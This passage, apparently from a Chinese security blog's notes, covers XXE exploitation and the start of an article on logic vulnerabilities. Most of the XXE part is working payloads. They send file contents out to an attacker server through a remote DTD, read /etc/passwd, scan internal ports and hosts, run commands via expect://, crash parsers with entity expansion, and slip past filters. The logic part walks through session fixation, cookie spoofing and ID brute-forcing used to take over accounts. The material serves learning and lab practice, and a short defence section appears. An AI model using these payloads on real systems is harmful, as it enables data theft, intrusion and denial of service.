all&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://185.243.241.45/?data=%file;&#x27;&gt;&quot;&gt;%all;\n//攻击payload：&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://185.243.241.45/evil.dtd&quot;&gt;%dtd;%send;]&gt;\n2.2.4.查看访问日志\n这里的查看访问日志，是在攻击者的服务器上查看，不要搞错。可以通过下面的图片看到，我们成功获取到日志。\n\n2.2.5.查看日志内容\n由于是base64加密的，所以我们还需要对其进行解密，通过解密可以看到，日志的内容和Windows中的win.ini的内容是一样的。\n\n2.2.6.调用解释\n这里需要结合payload进行理解，不然单单看解释有点难理解。\n  在构建的payload中会发现，可以看到挺难理解的，我们根据构建的payload进行解释一下，首先%dtd去调用vps上的evil.dtd文件，这个有点类似于将evil.dtd文件包含进来的感觉，然后调用evil.dtd文件中的%all，%all再去调用%file，而%file就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到%send 以后(因为实体的值中不能有 %, 所以将其转成html实体16进制编码&amp;#x25；)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，成功解决外带的情况。\n2.3.基于报错案例\n基于报错的原理和无回显类似，无回显通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。所以和无回显的构造方式几乎只有url出不同，其他地方一模一样。\n  简答来说，报错就是将返回的数据，本该返回回去，但由于URL地址是错误的，那么就会出现报错，将数据显示在报错中。\n  参考链接：https://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/\n2.3.1.引入服务器文件案例\n引入服务器文件的操作和无回显案例基本一致，就是上面提到的解释。\n2.3.1.1.修改配置文件\n这里为了能够实现报错，需要在配置文件中，将不显示报错内容给注释了。\n\n2.3.1.2.构建payload\n首先在攻击者服务器中创建evil.dtd文件，在文件中写入payload，在这个payload中会存在一个alskdnm的地方，原本在无回显中这里会写上服务器的IP地址，但是这里随便写一个不存在的地址，使其能够出现报错。\n&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://alskdnm/?data=%file;&#x27;&gt;&quot;&gt;%start;\n构建攻击的payload的语句\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ENTITY % remote SYSTEM &quot;http://185.243.241.45/evil.dtd&quot;&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/windows/win.ini&quot;&gt;%remote;%send;]&gt;&lt;message&gt;1234&lt;/message&gt;\n2.3.1.3.测试效果\n通过返回的数据包内容，可以看到原本应该出现在服务器日志中的编码的数据，现在在前端中了，而这就是基于报错的原因。\n\n2.3.1.4.编码还原\n我们对编码进行还原，查看效果。\n\n2.3.2.通过引入本地文件\n关于引入本地文件，通过上面的参考链接中的作者的话，这样可行，但是引入本地链接，我这边没有靶场，不好进行测试，如果感兴趣可以去作者的文章中去了解一些，但是，引入本地文件，必然不是一件容易的事。实现起来不管是引入外部或内部，都挺困难的。当然在黔驴技穷的时候，这也是一个不错的办法。\n九、探测端口存活\n这里端口探测，经过测试，不管有没有回显，都只能靠响应时间来进行判断，这里如果不好判断，可以优先测试一下正常不会开放的端口，然后查看响应时长，然后再去测试一下，正常会开放的端口，例如：3389、80、443、22、23等端口。然后比较两个响应的时长，通常来说，端口开放了，响应会快一点，而端口未开放则响应会比较慢。\n3.1.探测端口案例\n这里依旧是使用xxelabs靶场做演示，这里我也不改什么回显不回显的情况了，直接进行测试。\n3.1.1.抓包\n这里把抓到的包放入重放器中。\n3.1.2.构建payload\n这里我开放了3389端口以及80端口，未开放22端口以及23端口。我们分别进行测试。\n  这里有两种payload，一种是直接在回显位置修改，一种是不需要管回显位置的内容，同时这里面输入的IP是内网中你想要测试的IP地址以及后面的端口号。这里我只测试一个payload。\n1.payload&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://185.243.241.45:3389&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;2.payload：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://185.243.241.45:3389&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;\n3.1.3.测试开放端口\n这里首先测试3389端口和80端口，注意看右下角的响应时间。\n3.1.3.1.测试3389端口\n在测试3389端口后，页面的响应时间为2312毫秒。\n\n3.1.3.2.测试80端口\n可以看到，我们测试80端口，响应时间为102毫秒。当我们使用第一种payload的时候同时存在回显的话，页面中就会把80端口页面中的信息也显示出来了，这里测试的结果是不是就可以间接性读取内网中其它服务器的敏感文件？\n\n3.1.4.测试未开放端口\n这里测试22端口以及23端口，主要看右下角响应时间，同时你也会发现一个问题。\n3.1.4.1.测试22端口\n测试22端口后，响应的时间达到了21秒多。\n\n3.1.4.2.测试23端口\n其实测试23端口后，发现同样也是21秒多。\n\n3.2.自动化探测端口\n3.2.1.抓包并修改\n这里还是一样将抓到的包，并添加payload。\n3.2.2.发送测试器\n将修改好的包发送到测试器中，然后进行爆破。\n\n3.2.3.设置变化内容\n首先将所有的自动选择的内容全部清除，然后将设定要变化的端口。\n\n3.2.4.设置载荷\n我这里为了测试方便，我就随便输入几个端口，输入端口完成后，点击开始攻击\n\n3.2.5.查看攻击效果\n这里首先需要将列中接受响应计数勾上，然后点击接受响应计数，就会自动将最短的响应时长排在前面，这样我们就能够完成自动化测试了，无需手动测试，这里显示有四个时长短的\n\n3.3.总结\n从响应的时间对比，其实不难看出，当端口开放的时候就可以响应时间就比较快，而端口未开放的时候响应时间就比较长。\n十、探测主机存活\n这里的探测主机存活使用payload的以及判断和探测端口是基本上是一样的，只是将后面的端口取消，这里就放一个payload，需要注意哦，这里是基于xxelabs靶场构建的payload的。正常的payload可以看探测端口案例中构建的第二个payload，那个才是正常的。\npayload：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://192.168.10.51&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;\n4.1.自动化探测主机存活\n这里我就不演示手动测试的了，只演示自动化的。\n4.1.1.设置变化内容\n这里选中主机的最后一位，设置为变化的内容。\n\n4.1.2.设置载荷\n这里由于我就开一台服务器，是185.243.241.45，我们添加45但56与43我都没开启。（离谱的是我没有40这个主机，但却有响应，估计是别人的？）\n\n4.1.3.查看攻击效果\n从攻击的效果的响应时长来看，也就45、40的通的，其它都是不通的。\n\n十一、更改Content-Type类型\n这里就是解释在xxe的盲猜，在不确定是否能够执行的时候，通过修改Content-Type头，让其能够识别xml的语句，实现漏洞利用。更改Content-Type头类型有：application/xml与text/xml。\n5.1.CTF题目案例\nCTF-Jarvis-OJ-Web-XXE(CTF题)访问地址\n5.1.1.抓包\n通过抓包发现该靶场的数据的传输方式是json。\n\n5.1.2.修改类型\n这里我们需要将类型修改为xml。\n\n5.1.3.构建payload\n这里需要将原先下面输出的内容给删除，然后输入上payload。\npayload：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;x&gt;&amp;b;&lt;/x&gt;\n5.1.4.测试效果\n这里就可以看到我们成功读取到etc下的passwd内容。\n\n十二、内网探测\n和读文件差不多，只不过把URI改成内网机器地址\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        &lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY rabbit SYSTEM &quot;http://127.0.0.1/1.txt&quot; &gt;]&gt;&lt;user&gt;&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;&lt;lastname&gt;666&lt;/lastname&gt;&lt;/user&gt;\n十三、RCE\nXXE漏洞利用技巧：从XML到远程代码执行\n这种情况很少发生，但有些情况下攻击者能够通过XXE执行代码，这主要是由于配置不当/开发内部应用导致的。如果我们足够幸运，并且PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，那么我们就可以执行如下的命令：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;&lt;catalog&gt;   &lt;core id=&quot;test101&quot;&gt;      &lt;author&gt;John, Doe&lt;/author&gt;      &lt;title&gt;I love XML&lt;/title&gt;      &lt;category&gt;Computers&lt;/category&gt;      &lt;price&gt;9.99&lt;/price&gt;      &lt;date&gt;2018-10-01&lt;/date&gt;      &lt;description&gt;&amp;xxe;&lt;/description&gt;   &lt;/core&gt;&lt;/catalog&gt;\n响应：\n&#123;&quot;error&quot;: &quot;no results for description uid=0(root) gid=0(root) groups=0(root)...\n十四、DOS\nXXE萌新进阶全攻略\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE lolz [  &lt;!ENTITY lol &quot;lol&quot;&gt;  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt;&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;\n此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。\n亦或者，如果目标是UNIX系统，\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [   &lt;!ELEMENT foo ANY &gt;  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;\n如果 XML 解析器尝试使用/dev/random文件中的内容来替代实体，则此示例会使服务器（使用 UNIX 系统）崩溃。\n十五、绕过姿势\n参考cl4y师傅博客xxe笔记\n绕过WAF保护的XXE\nENTITY``SYSTEM``file等关键词被过滤\n使用编码方式绕过：UTF-16BE\ncat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml\n若http被过滤，可以\n6.1.data://协议绕过\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a &quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;&gt;     %a;    %b;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;\n6.2.file://协议加文件上传\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;&lt;!--上传文件--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt;\n6.3.php://filter协议加文件上传\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;&lt;!ENTITY hhh SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;&gt;\n&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;&gt;    %a;]&gt;    &lt;test&gt;        &amp;hhh;    &lt;/test&gt;&lt;!--上传文件--&gt;PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==\n6.4 其他\n方法1：文档中的额外空格方法2：格式无效方法3: 外来编码（Exotic encodings）方法4：在一个文档中使用两种类型的编码\n参考：https://xz.aliyun.com/t/4059    --绕过方法\n十六、利用场景\n7.1.svg\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;]&gt;&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;&lt;/svg&gt;\ntips:从当前文件夹读取文件可以使用/proc/self/cwd\n7.2.excel\n利用EXCEL进行XXE攻击\n首先用excel创建一个空白的xlsx，然后解压\nmkdir XXE &amp;&amp; cd XXEunzip ../XXE.xlsx\n将[Content_Types].xml改成恶意xml，再压缩回去\nzip -r ../poc.xlsx *\n7.3 微信支付漏洞分析\n实例二：微信支付的 XXE\n前一阵子非常火的微信支付的 XXE 漏洞当然不得不提，当然目前我是看不懂的，所以就先了解一下\n漏洞描述：\n微信支付提供了一个 api 接口，供商家接收异步支付结果，微信支付所用的java sdk在处理结果时可能触发一个XXE漏洞，攻击者可以向这个接口发送构造恶意payloads,获取商家服务器上的任何信息，一旦攻击者获得了敏感的数据 (md5-key and merchant-Id etc.)，他可能通过发送伪造的信息不用花钱就购买商家任意物品\n我下载了 java 版本的 sdk 进行分析，这个 sdk 提供了一个 WXPayUtil 工具类，该类中实现了xmltoMap和maptoXml这两个方法，而这次的微信支付的xxe漏洞爆发点就在xmltoMap方法中\n如图所示：\n\n问题就出现在我横线划出来的那部分，也就是简化为下面的代码：\npublic static Map&lt;String, String&gt; xmlToMap(String strXML) throws Exception &#123;        try &#123;            Map&lt;String, String&gt; data = new HashMap&lt;String, String&gt;();            DocumentBuilder documentBuilder = WXPayXmlUtil.newDocumentBuilder();            InputStream stream = new ByteArrayInputStream(strXML.getBytes(&quot;UTF-8&quot;));            org.w3c.dom.Document doc = documentBuilder.parse(stream);            ...\n我们可以看到 当构建了 documentBuilder 以后就直接对传进来的 strXML 解析了，而不巧的是 strXML 是一处攻击者可控的参数，于是就出现了 XXE 漏洞，下面是我实验的步骤\n首先我在 com 包下又新建了一个包，来写我们的测试代码，测试代码我命名为 test001.java\n如图所示：\n\ntest001.java\npackage com.test.test001;import java.util.Map;import static com.github.wxpay.sdk.WXPayUtil.xmlToMap;public class test001 &#123;    public static void main(String args[]) throws Exception &#123;        String xmlStr =&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;\\r\\n&quot; +                &quot;&lt;!DOCTYPE XDSEC [\\r\\n&quot; +                &quot;&lt;!ENTITY xxe SYSTEM &#x27;file:///d:/1.txt&#x27;&gt;]&gt;\\r\\n&quot; +                &quot;&lt;XDSEC&gt;\\r\\n&quot;+                &quot;&lt;XXE&gt;&amp;xxe;&lt;/XXE&gt;\\r\\n&quot; +                &quot;&lt;/XDSEC&gt;&quot;;        try&#123;            Map&lt;String,String&gt; test = xmlToMap(xmlStr);            System.out.println(test);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;\n我希望它能读取我 D 盘下面的 1.txt 文件\n运行后成功读取\n如图所示：\n\n当然，WXPayXmlUtil.java 中有这个 sdk 的配置项，能直接决定实验的效果，当然后期的修复也是针对这里面进行修复的\nhttp://apache.org/xml/features/disallow-doctype-decl truehttp://apache.org/xml/features/nonvalidating/load-external-dtd falsehttp://xml.org/sax/features/external-general-entities falsehttp://xml.org/sax/features/external-parameter-entities false\n整个源码我打包好了已经上传到我的百度云，有兴趣的童鞋可以运行一下感受：\n\n链接：https://pan.baidu.com/s/1YbCO2cZpzZS1mWd7Mes4Qw 提取码：xq1b\n\n上面说过 java 中有一个 netdoc:/ 协议能代替 file:/// ,我现在来演示一下：\n如图所示：\n\n十七、XXE漏洞防御\n8.1.禁用外部实体\n使用开发语言提供的禁用外部实体的方法。\nPHP：libxml_disable_entity_loader(true);java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))\n8.2.过滤数据\n可以将用户提交的xml数据进行过滤，例如关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。\n十三、参考\nhttps://blog.szfszf.top/tech/blind-xxe-详解-google-ctf-一道题目分析/\nhttps://www.cnblogs.com/20175211lyz/p/11413335.html\nhttps://xz.aliyun.com/t/3357#toc-8\n​\t\thttps://www.cnblogs.com/zhengna/p/15740341.html   --靶场实践参考\n","categories":["常见top漏洞"]},{"title":"逻辑漏洞","url":"/2023/07/29/%E6%B5%85%E6%9E%90%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"浅析逻辑漏洞\n1. 漏洞介绍\n1.1 成因\n设计阶段产生，老司机也会产生、相对难发现、难以防护，相对容易利用 第三方逻辑缺陷、没有在设计初期进行安全审计、安全水平及对安全认知程度不一致\n\t逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现任意密码修改（没有旧密码验证）、越权访问、密码找回、交易支付金额等。\n\n​\t\t逻辑漏洞是指攻击者利用业务/功能上的设计缺陷，获取敏感信息或破坏业务的完整性, 逻辑漏洞的破坏方式并非是向程序添加破坏内容，而是利用逻辑处理不严密或者代码问题或固有不足，操作上并不影响程序的允许，在逻辑上是顺利执行的。\n这种漏洞一般防护手段或设备无法阻止，因为走的是合法流量也没有防御标准。\n1.2 分析\n​\t\t对常见的漏洞进行过统计，发现其中越权操作和逻辑漏洞占比最高，很多平台中基本都有发现，包括任意查询用户信息、任意删除等行为；最严重的漏洞出现在账号安全，包括重置任意用户密码、验证码暴力破解等。\n逻辑漏洞的重要性\n常见的OWASP漏洞，通过漏洞扫描工具，大多支持自动化或者半自动化扫描出来，并且传统的安全设备或者防护措施收效甚微\n​\t\t但逻辑漏洞是和系统自身功能和逻辑有关系的漏洞，每一家的漏洞出现可能存在一定的独特性，很难复制或者通过规则脚本和漏扫工具扫描出来，因此逻辑漏洞大多需要配合代码审计和手段测试才可以发现相关漏洞，也是工具无法代替人工的漏洞。\n\n2. 逻辑漏洞详解\n2.1 常见的逻辑漏洞\n逻辑漏洞的分类    越权漏洞    密码需改    密码找回    验证码漏洞    支付漏洞    投票/积分/抽奖    短信轰炸即：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞。\n2.2 如何挖掘逻辑漏洞\n确定业务流程---&gt;寻找流程中可以被操控的环节---&gt;分析可被操控环节中可能产生的逻辑问题---&gt;尝试修改参数触发逻辑问题        \n\n2.3 身份验证漏洞\n1. 暴力破解漏洞\n漏洞介绍：攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作\n漏洞原理：由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举\n漏洞点：系统登录点\n漏洞修复： 对于固定用户名爆破密码\n\n可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码\n但是不能永久锁定，可能被用来进行账户恶意锁定\n\n对于固定密码枚举用户名、 需要计算IP对URL的请求情况，某个IP短时间大量请求登录应该加入黑名单 进行传输数据加密有一定的防护效果\n2. Session固定攻击\n漏洞介绍：会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人\n漏洞原理：在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息\n攻击流程：\n1、攻击者Attacker能正常访问该应用网站；2、应用网站服务器返回一个会话ID给他；3、攻击者Attacker用该会话ID构造一个该网站链接发给受害者Victim；4-5、受害者Victim点击该链接，携带攻击者的会话ID和自己的用户名密码正常登录了该网站，会话成功建立；6、攻击者Attacker用该会话ID成功冒充并劫持了受害者Victim的会话。这里相当于受害者用该会话ID登录后，便将该会话ID提权为管理员了，而我们攻击者凭借该会话ID去登录该网站时，成功以管理员的身份进入，当然这里受害者是普通用户也是可以的\n漏洞点：在GET方法请求登录时候带有session值\n访问网站（未登录）：获取cookie信息，获取sessionid登录网站：查看cookie信息，获取sessionid查看登录前，登录后sessionid是否相同，若相同，则存在该漏洞\n修复思路：\n\n只要避免在URL中带入session信息即可比较有效的防御\n另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复\n\n漏洞实战\n这里用YXcms建站系统复现，由于源代码太难找了，这里就跟着走吧…\n复现过程\nyxcms允许我们自定义session，而且这个过程通过get方式来完成。我觉得这样的问题属于CSRF，不经意之间就能获取大效果。其问题代码如下：\n&lt;?php&lt;br&gt;//公共类&lt;br&gt;class commonController extends baseController&#123;public function __construct()&lt;br&gt; &#123;&lt;br&gt; parent::__construct();&lt;br&gt;        if(!empty($_GET[&#x27;phpsessid&#x27;])) session_id($_GET[&#x27;phpsessid&#x27;]);//通过GET方法传递sessionid,firefox&lt;br&gt;        session_starts();&lt;br&gt; ……\n当$_GET[‘phpsessid’]非空时，就令session_id为我们传入的值。\n于是我们构造一个链接让管理员点击，管理员点击后会重新设置他的session，而且这个session就是我们构造的。因为session重置了所以管理员也需要重新登录，而重新登录后其session_id就是我们构造的。我们只要利用这个session_id就能登录管理后台了。\n比如我构造一个链接：\nhttp://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456\n将这个链接发给受害者（火狐浏览器），诱使受害者管理员点击该链接，点击后后会跳转到登录页面，但此时他的phpsession已经是我们构造的f4cking456了\n\n此时如果受害者登录这个网址，那么这个session就有后台权限了。\n假如受害者登录该网址\n\n那么我们利用这个链接\nhttp://192.168.36.140/yxcms/index.php?r=admin/index/index&amp;phpsessid=f4cking456，将自己的session设置成f4cking456，或者随意怎么修改，只要把phpsessid修改成f4cking123就能拥有后台权限了\n这时攻击者（谷歌浏览器）访问该链接，直接进入后台界面\n\n有个前提就是，实战过程中你需要知道该网站后台地址是什么\n3. Cookie欺骗漏洞\n漏洞介绍：通过伪造cookie信息能够伪造其他用户进行登录。\n漏洞原理：开发者为了方便将身份信息/登录信息明文或者只是简单编码、哈希之后存放在cookie中，网站通过获取得到的cookie进行授权或者身份验证\n漏洞点：cookie中有明显或者只是简单编码、哈希的字段时候 修改lsLogin值为1可以判定为用户已经登录 修改cookie为asp163=UserName=admin\n漏洞修复： Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改\n漏洞实战\n大体就是通过某种手段获取其他用户或者管理员的cookie，而由于该cookie存储的是可理解的身份信息和登录信息，则攻击者获取该cookie后，凭借该cookie登录网站便可以实现免密登录到其他用户或者管理员页面\n2.4 权限类逻辑漏洞\n权限相关逻辑漏洞是逻辑漏洞中出现的最多的漏洞\n1. 平行权限跨越\n漏洞介绍：即普通用户/管理员能访问其他普通用户/管理员才能够访问的系统信息或者系统功能\n形成原因：在进行方法调用时候未进行请求用户和目标信息拥有者是否匹配一致，直接用userid/email之类的容易遍历的参数进行数据库查询\n漏洞点：在普通用户/管理员登录后的能访问的链接或者功能中都可能存在\n漏洞修复：\n在权限管理中，平行越权的权限管理颗粒度最小\n需要在方法中进行相关的获取请求request，再利用getAttribute(“userid”)获取其userid，直接使用该userid作为参数进行数据增删查改，避免userid参数传输\n漏洞复现\n登录，同时bp抓包：\n\n\n放包，可以看到当前的test用户（这里放包了很多次…）\n\n在这里可以看到这个card_id对应的就是每个用户对应的id\n发送到爆破模块遍历一下，这里他是对后两位进行的遍历\n\n\n然后来到登录界面，右键查看马春生的图片，检查源代码属性：发现其id尾号以16结尾，我们开始爆破\n\n这里就是马春生的个人信息\n\n我们将密码拿去md5破解一下\n\n随后凭借该用户名和密码登录即可，成功拿到key\n\n漏洞总结\n先公布一下背景\n钻石代理商马春生同学卷款逃跑，多位下级代理内心受到了难以磨灭的伤害，为了找到她我们将通过代理网站获取到她的手机号码等信息。\n这里我也是跟着教程做的，因此几乎没有自己的思考，为了不摸鱼，还是浅浅总结一下\n题目告知我们重点是马春生，那我们便要实现水平越权以便以马春生的用户信息登录网站，那我们进入靶场（我尽可能的以实战的思路来吧），首先就是搜集信息，burp抓包，F12这些肯定是少不了的，这里也是学到了一点东西，搜集信息尤为重要\n这里在实战中就是会费时间，这里我陈述的也就是凭借答案来陈述吧，所以会参考性低一些我们burp抓包，然后观察抓到的东西，一次次放包查看什么时候会有重要信息，随后我们在放包的过程中，很幸运在url头发现了有关证明用户信息的id，并且联系我们之前对页面的那些图片的查看，发现图片的src处有一堆数字，这与我们发现的用户id及其相似，那我们有理由推断那就是马春生同学的用户id，但我们只能了解到这里，想要获取他的用户名密码便无从下手，于是我们通过burp的爆破模块，对用户id后两位进行遍历，成功在id=16处（也就是马春生同学的id）发现了马春生的详细个人信息，至此我们成功实现水平越权（服务端没有对用户id做出精确的维护）\n2. 垂直权限跨越\n漏洞介绍：即普通用户能够访问管理员甚至超级管理员才能够访问的系统信息或者系统功能\n形成原因：程序在方法调用时候，缺少角色等级校验\n漏洞点：在任何用户登录后才能访问的链接或者功能中都可能存在\n对每一个传输的参数都要了解参数的目的，尝试将用户名改为admin尝试绕过\n漏洞修复：\n需要校验用户是否有权限访问这个方法\n获取请求request，再利用getAuttribute(“roleid”)获取其角色等级，检查角色等级是否合法，错误则直接返回错误跳转，返回页面必须仍然从Attribute中获取userid再进一步查询相关信息，值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息。\nCouchdb 垂直越权（CVE-2017-12635）\nCouchdb简介\tApache CouchDB是一个开源数据库，专注于易用性和成为&quot;完全拥抱web的数据库&quot;。它是一个使用JSON作为存储格式，JavaScript作为查询语言，MapReduce和HTTP作为API的NoSQL数据库。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。​ 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。​ 影响版本：Apache CouchDB before 1.7.0 and 2.x before 2.1.1\n漏洞成因\n问题在于 Javascript JSON 解析器（在验证脚本中使用）与 CouchDB 内部使用的名为jiffy的解析器之间存在差异。查看每个对象如何处理对象上的重复键，例如：&#123;&quot;foo&quot;:&quot;bar&quot;, &quot;foo&quot;:&quot;baz&quot;&#125;\nErlang：\n&gt; jiffy:decode(&quot;&#123;\\&quot;foo\\&quot;:\\&quot;bar\\&quot;, \\&quot;foo\\&quot;:\\&quot;baz\\&quot;&#125;&quot;). &#123;[&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;bar&quot;&gt;&gt;&#125;,&#123;&lt;&lt;&quot;foo&quot;&gt;&gt;,&lt;&lt;&quot;baz&quot;&gt;&gt;&#125;]&#125;\nJavaScript：\n&gt; JSON.parse(&quot;&#123;\\&quot;foo\\&quot;:\\&quot;bar\\&quot;, \\&quot;foo\\&quot;: \\&quot;baz\\&quot;&#125;&quot;)&#123;foo: &quot;baz&quot;&#125;\n对于给定的键，Erlang 解析器将存储这两个值，但 Javascript 解析器将仅存储最后一个值。不幸的是，CouchDB 数据内部表示的 get_value 函数只会返回第一个值：\n% Within couch_util:get_value lists:keysearch(Key, 1, List).  % keysearch(Key, N, TupleList) -&gt; &#123;value, Tuple&#125; | false% Searches the list of tuples TupleList for a tuple whose Nth element compares equal to 